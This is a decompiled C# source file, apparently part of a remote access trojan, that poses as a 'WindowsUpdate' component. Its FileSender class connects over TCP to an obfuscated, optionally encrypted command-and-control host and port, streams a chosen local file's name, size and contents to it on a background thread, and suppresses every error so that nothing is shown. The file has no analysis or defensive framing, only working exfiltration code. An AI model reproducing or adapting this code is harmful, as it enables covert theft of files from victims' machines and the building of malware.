using System;
using System.IO;
using System.Net.Sockets;
using System.Threading;
using Microsoft.VisualBasic.CompilerServices;

namespace WindowsUpdate;

public class FileSender
{
	private int BUFFERSIZE;

	public string fname;

	public string fullname;

	public FileSender()
	{
		BUFFERSIZE = 20480;
	}

	public void Threader()
	{
		Thread thread = new Thread(Send);
		thread.Start();
	}

	private void Send()
	{
		checked
		{
			try
			{
				FileInfo fileInfo = new FileInfo(fullname);
				TcpClient tcpClient = new TcpClient();
				if (Operators.CompareString(A.EncryptStatus, "True", false) == 0)
				{
					tcpClient.Connect(A.C.DecryptData(A.DEB(ref A.EncryptKey), A.h), Conversions.ToInteger(A.DEB(ref A.dwport)));
				}
				else
				{
					tcpClient.Connect(A.DEB(ref A.h), Conversions.ToInteger(A.DEB(ref A.dwport)));
				}
				BinaryWriter binaryWriter = new BinaryWriter(tcpClient.GetStream());
				binaryWriter.Write(fileInfo.get_Name());
				binaryWriter.Write(fileInfo.Length);
				using (FileStream fileStream = new FileStream(fullname, FileMode.Open, FileAccess.Read))
				{
					byte[] array = new byte[BUFFERSIZE + 1];
					int num = -1;
					int num2 = 0;
					while (num != 0)
					{
						num = fileStream.Read(array, 0, array.Length);
						tcpClient.GetStream().Write(array, 0, num);
						num2 += num;
					}
				}
				binaryWriter.Close();
				tcpClient.Close();
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}
}
